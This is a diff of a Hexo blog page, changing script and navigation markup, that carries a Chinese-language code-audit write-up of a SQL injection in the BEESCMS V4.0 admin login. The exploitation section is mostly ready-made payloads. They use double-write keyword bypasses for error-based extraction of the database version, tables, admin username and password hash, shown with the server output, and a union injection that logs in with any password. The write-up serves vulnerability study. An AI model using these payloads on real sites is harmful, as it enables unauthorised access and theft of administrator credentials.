@@ -69,6 +69,16 @@
     
 	<!-- mathjax -->
 	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
 <meta name="generator" content="Hexo 6.1.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
@@ -83,13 +93,13 @@
         <!--
        --><li><a href="/">Home</a></li><!--
      --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
+       --><li><a href="/archives/">Articles</a></li><!--
      --><!--
-       --><li><a href="/categories/">categories</a></li><!--
+       --><li><a href="/categories">Categories</a></li><!--
      --><!--
-       --><li><a href="/tags/">tags</a></li><!--
+       --><li><a href="/tags">Tags</a></li><!--
      --><!--
-       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projectes</a></li><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projects</a></li><!--
      -->
       </ul>
     </span>
@@ -192,7 +202,11 @@
 <p>PHP+MYSQL，多语言系统，内容模块易扩展，模板风格多样化，模板制作简单功能强大，专业SEO优化，后台操作方便，完全可以满足企业网站、外贸网站、事业单位、教育机构、个人网站使用。</p>
 </blockquote>
 <p>审计工具</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">seay源代码审计系统</span><br><span class="line">phpstudypro</span><br><span class="line">phpstrom</span><br><span class="line">chrome</span><br><span class="line">beescms 版本V4.0_R_20150708</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">seay源代码审计系统
+phpstudypro
+phpstrom
+chrome
+beescms 版本V4.0_R_20150708</code></pre>
 
 
 
@@ -200,41 +214,70 @@
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115131448747.png" alt="image-20211115131448747"></p>
 <p>首先将<code>$_POST[&#39;user&#39;]</code>以及<code>$_POST[&#39;password&#39;]</code>传入的值传递给<code>fl_value()</code>函数，跟进这个函数,其位于<code>includes/fun.php</code>,具体内容如下:</p>
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115131934091.png" alt="image-20211115131934091"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file</span></span><br><span class="line"><span class="string">r|outfile/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fl_value</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;
+	<span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$str</span>))&#123;<span class="hljs-keyword">return</span>;&#125;
+	<span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file</span>
+<span class="hljs-string">r|outfile/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$str</span>);
+&#125;</code></pre>
 
 <p>可以看到这个函数使用<code>preg_replace</code>的方法对传入的值中的sql铭感关键字进行了替换.</p>
 <p>fl_value()外面的函数<code>fl_html()</code>的具体内容为</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_html</span>(<span class="params"><span class="variable">$st</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$st</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fl_html</span>(<span class="hljs-params"><span class="hljs-variable">$st</span></span>)</span>&#123;
+	<span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$st</span>);
+&#125;</code></pre>
 
 <p>其主要目的对传入的值使用<code>htmlspecialchars()</code>函数，在一定程度上预防了用户的xss.</p>
 <p>继续跟进<code>login.php</code>，在59行发现<code>check_login()</code>函数，跟进，函数体在<code>includes/fun.php</code>中的第970行。其具体内容为</p>
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115133743184.png" alt="image-20211115133743184"></p>
 <p>可以看到在<code>971</code>行,直接将传入的<code>$user</code>进行了数据库语句拼接:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rel</span>=<span class="variable">$GLOBALS</span>[<span class="string">&#x27;mysql&#x27;</span>]-&gt;<span class="title function_ invoke__">fetch_asc</span>(<span class="string">&quot;select id,admin_name,admin_password,admin_purview,is_disable from &quot;</span>.DB_PRE.<span class="string">&quot;admin where admin_name=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27; limit 0,1&quot;</span>);</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php"><span class="hljs-variable">$rel</span>=<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;mysql&#x27;</span>]-&gt;<span class="hljs-title function_ invoke__">fetch_asc</span>(<span class="hljs-string">&quot;select id,admin_name,admin_password,admin_purview,is_disable from &quot;</span>.DB_PRE.<span class="hljs-string">&quot;admin where admin_name=&#x27;&quot;</span>.<span class="hljs-variable">$user</span>.<span class="hljs-string">&quot;&#x27; limit 0,1&quot;</span>);</code></pre>
 
 <p>结合前面的的<code>fl_value()</code>,可以使用双写绕过从而造成<code>sql注入</code>.</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><em><strong>一 报错注入</strong></em></p>
 <p>输入单引号回回显sql报错语句，于是这里尝试使用报错注入</p>
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115141944516.png" alt="image-20211115141944516"></p>
 <p>根据上面<code>fl_value</code>的替换，构造payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; uni union on selselectect extractvalue(1,concat(0x7e,(selselectect @@version),0x7e))#</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">1&#x27; uni union on selselectect extractvalue(1,concat(0x7e,(selselectect @@version),0x7e))#</code></pre>
 
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115142645430.png" alt="image-20211115142645430"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 爆表名</span><br><span class="line">1&#x27; uni union on selselectect extractvalue(1,concat(0x7e,(selselectect group_concat(table_name) fr from om information_schema.tables wh where ere table_schema like database()),0x7e))#</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext"># 爆表名
+1&#x27; uni union on selselectect extractvalue(1,concat(0x7e,(selselectect group_concat(table_name) fr from om information_schema.tables wh where ere table_schema like database()),0x7e))#</code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 爆字段名</span><br><span class="line">1&#x27; uni union on selselectect extractvalue(1,concat(0x7e,(selselectect group_concat(column_name) fr from om information_schema.columns wh where ere table_schema like database() an and d table_name like &#x27;bees_admin&#x27;),0x7e))#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext"># 爆字段名
+1&#x27; uni union on selselectect extractvalue(1,concat(0x7e,(selselectect group_concat(column_name) fr from om information_schema.columns wh where ere table_schema like database() an and d table_name like &#x27;bees_admin&#x27;),0x7e))#
+</code></pre>
 
 <p><em><strong>其实上两步可以忽略，因为报错信息已经给出了关键表名和字段名</strong></em></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 爆内容</span><br><span class="line">## 用户名</span><br><span class="line">1&#x27; uni union on selselectect extractvalue(1,concat(0x7e,(selselectect admin_name fr from om bees_admin),0x7e))#</span><br><span class="line">PATH syntax error: &#x27;~admin~&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 密码</span><br><span class="line">1&#x27; uni union on selselectect extractvalue(1,concat(0x7e,(selselectect admin_password fr from om bees_admin),0x7e))#</span><br><span class="line">PATH syntax error: &#x27;~21232f297a57a5a743894a0e4a801fc&#x27;</span><br><span class="line">从这里可以看到其实返回结果并不完全，使用right()函数获取未显示部分</span><br><span class="line">1&#x27; uni union on selselectect extractvalue(1,concat(0x7e,(selselectect right((selselectect admin_password fr from om bees_admin),10)),0x7e))#</span><br><span class="line">PATH syntax error: &#x27;~0e4a801fc3~&#x27;</span><br><span class="line">最终结果：21232f297a57a5a743894a0e4a801fc3</span><br><span class="line">解密结果：admin</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext"># 爆内容
+## 用户名
+1&#x27; uni union on selselectect extractvalue(1,concat(0x7e,(selselectect admin_name fr from om bees_admin),0x7e))#
+PATH syntax error: &#x27;~admin~&#x27;
+
+
+## 密码
+1&#x27; uni union on selselectect extractvalue(1,concat(0x7e,(selselectect admin_password fr from om bees_admin),0x7e))#
+PATH syntax error: &#x27;~21232f297a57a5a743894a0e4a801fc&#x27;
+从这里可以看到其实返回结果并不完全，使用right()函数获取未显示部分
+1&#x27; uni union on selselectect extractvalue(1,concat(0x7e,(selselectect right((selselectect admin_password fr from om bees_admin),10)),0x7e))#
+PATH syntax error: &#x27;~0e4a801fc3~&#x27;
+最终结果：21232f297a57a5a743894a0e4a801fc3
+解密结果：admin</code></pre>
 
 
 
 <p><em><strong>二 任意密码登录</strong></em></p>
 <p>在<code>check_login()</code>中可以看到会将用户的输入的密码进行md5加密后在与数据库查询结果进行比较.</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$password</span>!=<span class="variable">$rel</span>[<span class="string">&#x27;admin_password&#x27;</span>])&#123;</span><br><span class="line">		<span class="title function_ invoke__">msg</span>(<span class="string">&quot;输入的密码不正确&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$rel</span>[<span class="string">&#x27;is_disable&#x27;</span>])&#123;</span><br><span class="line">		<span class="title function_ invoke__">msg</span>(<span class="string">&#x27;该账号已经被锁定,无法登陆&#x27;</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php"><span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>);
+	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span>!=<span class="hljs-variable">$rel</span>[<span class="hljs-string">&#x27;admin_password&#x27;</span>])&#123;
+		<span class="hljs-title function_ invoke__">msg</span>(<span class="hljs-string">&quot;输入的密码不正确&quot;</span>);
+	&#125;
+	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$rel</span>[<span class="hljs-string">&#x27;is_disable&#x27;</span>])&#123;
+		<span class="hljs-title function_ invoke__">msg</span>(<span class="hljs-string">&#x27;该账号已经被锁定,无法登陆&#x27;</span>);
+	&#125;</code></pre>
 
 <p>这里可以通过注入从而实现任意密码登录,前提得有一个已知用户名，构造payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名为：admin&#x27; a and nd 0 uni union on selselectect 1,2,md5(&#x27;123&#x27;),1,0;#</span><br><span class="line">密码为：123</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">用户名为：admin&#x27; a and nd 0 uni union on selselectect 1,2,md5(&#x27;123&#x27;),1,0;#
+密码为：123</code></pre>
 
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20211115155644431.png" alt="image-20211115155644431"></p>
 <p>可以看到成功跳转，绕过登录</p>
@@ -284,13 +327,13 @@
          
           <li><a href="/">Home</a></li>
          
-          <li><a href="/archives/">Writing</a></li>
+          <li><a href="/archives/">Articles</a></li>
          
-          <li><a href="/categories/">categories</a></li>
+          <li><a href="/categories">Categories</a></li>
          
-          <li><a href="/tags/">tags</a></li>
+          <li><a href="/tags">Tags</a></li>
          
-          <li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projectes</a></li>
+          <li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projects</a></li>
         
       </ul>
     </div>
@@ -343,13 +386,13 @@
         <!--
        --><li><a href="/">Home</a></li><!--
      --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
+       --><li><a href="/archives/">Articles</a></li><!--
      --><!--
-       --><li><a href="/categories/">categories</a></li><!--
+       --><li><a href="/categories">Categories</a></li><!--
      --><!--
-       --><li><a href="/tags/">tags</a></li><!--
+       --><li><a href="/tags">Tags</a></li><!--
      --><!--
-       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projectes</a></li><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projects</a></li><!--
      -->
       </ul>
     </nav>
